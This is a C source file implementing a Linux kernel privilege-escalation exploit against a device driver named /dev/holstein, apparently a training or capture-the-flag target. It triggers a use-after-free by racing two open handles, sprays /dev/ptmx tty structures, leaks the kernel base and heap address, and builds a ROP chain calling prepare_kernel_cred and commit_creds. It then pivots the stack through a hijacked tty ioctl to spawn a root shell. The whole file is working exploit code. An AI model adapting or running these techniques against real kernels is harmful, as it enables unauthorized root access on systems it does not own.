#include <ctype.h>      // for isdigit
#include <fcntl.h>      // for open, O_RDWR, O_NOCTTY, O_RDONLY
#include <inttypes.h>   // for uintptr_t, uint8_t, PRIx64, uint32_t
#include <sched.h>      // for sched_yield
#include <stdbool.h>    // for true
#include <stdio.h>      // for printf, NULL, puts
#include <stdlib.h>     // for EXIT_SUCCESS
#include <string.h>     // for memset, strncmp
#include <sys/ioctl.h>  // for ioctl
#include <unistd.h>     // for read, close, write, execve

#define SPRAY_COUNT 50

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

int tty[SPRAY_COUNT];
uintptr_t g_buf;
int fd0;
int fd1;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t push_rdx_pop_rsp		= 0xffffffff8114fbea;
uintptr_t pop_rdi_add_cl_cl_ret		= 0xffffffff812bf3d3;
uintptr_t prepare_kernel_cred		= 0xffffffff81072560;
uintptr_t pop_rcx_ret			= 0xffffffff8150b6d6;
uintptr_t mov_rdi_rax_rep_movsq_ret	= 0xffffffff81638e9b;
uintptr_t commit_creds			= 0xffffffff810723c0;
uintptr_t kpti				= 0xffffffff81800e26;

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void uaf(void)
{
	char data[0x164];

	while (true) {
		fd0 = -1;
		fd1 = -1;

		memset(tty, 0, sizeof(tty));

		fd0 = open("/dev/holstein", O_RDWR);
		if (fd0 == -1)
			goto err;

		fd1 = open("/dev/holstein", O_RDWR);
		if (fd1 == -1)
			goto err;

		sched_yield();
		close(fd0);

		for (int i = 0; i < SPRAY_COUNT; ++i)
			tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

		fd0 = -1;

		read(fd1, data, 0x164);
		if (*(uint32_t *)data && strncmp(&data[0x160], "ptm", 3) == 0 &&
		    isdigit(*(uint8_t *)&data[0x163])) {
			printf("[+] uaf success\n");
			break;
		} else {
			goto err;
		}
err:
		if (fd0 > 0)
			close(fd0);
		for (int i = 0; i < SPRAY_COUNT; ++i) {
			if (tty[i] > 0)
				close(tty[i]);
		}
	}
}

static void leak_offset_and_g_buf(void)
{
	uint8_t data[0x40];
	uintptr_t ptr;

	read(fd1, data, 0x40);
	ptr = *(uintptr_t *)&data[0x18];
	offset = ptr - 0xffffffff81c39c60;
	printf("[+] offset %#" PRIx64 "\n", offset);

	g_buf = *(uintptr_t *)&data[0x38] - 0x38;
	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
}

int main(void)
{
	uint8_t data[0x400] = { 0 };
	uintptr_t *stack;

	save_state();

	uaf();
	leak_offset_and_g_buf();

	read(fd1, data, 0x400);
	stack = (uintptr_t *)data;
	*stack++ = OFFSET(pop_rdi_add_cl_cl_ret);
	*stack++ = (uintptr_t)NULL;
	*stack++ = OFFSET(prepare_kernel_cred);
	*stack++ = OFFSET(pop_rcx_ret);
	*stack++ = 0;
	*stack++ = OFFSET(mov_rdi_rax_rep_movsq_ret);
	*stack++ = OFFSET(commit_creds);
	*stack++ = OFFSET(kpti);
	*stack++ = 0;
	*stack++ = 0;
	*stack++ = (uintptr_t)shell;
	*stack++ = cs;
	*stack++ = rflags;
	*stack++ = rsp;
	*stack++ = ss;

	*(uintptr_t *)&data[0x3f8] = OFFSET(push_rdx_pop_rsp);
	write(fd1, data, 0x400);

	uaf();
	read(fd1, data, 0x18);
	*(uintptr_t *)&data[0x18] = g_buf + 0x3f8 - 0x0c * 8;
	write(fd1, data, 0x20);

	for (int i = 0; i < SPRAY_COUNT; ++i)
		ioctl(tty[i], 0, g_buf - 0x08);

	return EXIT_SUCCESS;
}
